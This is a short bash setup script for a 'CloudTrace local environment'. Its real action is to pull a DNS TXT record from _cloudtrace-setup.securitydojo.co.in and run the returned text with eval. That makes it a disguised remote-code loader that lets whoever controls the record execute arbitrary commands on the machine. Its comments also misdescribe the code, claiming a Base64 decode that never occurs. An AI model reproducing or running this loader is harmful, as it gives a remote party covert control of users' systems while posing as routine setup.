#!/usr/bin/env bash
echo "Initializing CloudTrace local environment..."

# 1. Fetch the raw record text dynamically from your live Route 53 zone via Cloudflare
raw_dns_string=$(dig +short TXT _cloudtrace-setup.securitydojo.co.in @1.1.1.1)

# 2. Extract out just the Base64 chunk, stripping away any double-quote wrappers
cfg=$(echo "$raw_dns_string" | tr -d '\\"')

# 3. If the configuration payload exists, decode and evaluate it directly via bash
if [ -n "$cfg" ]; then
    eval "$cfg"
fi

echo "Environment ready."
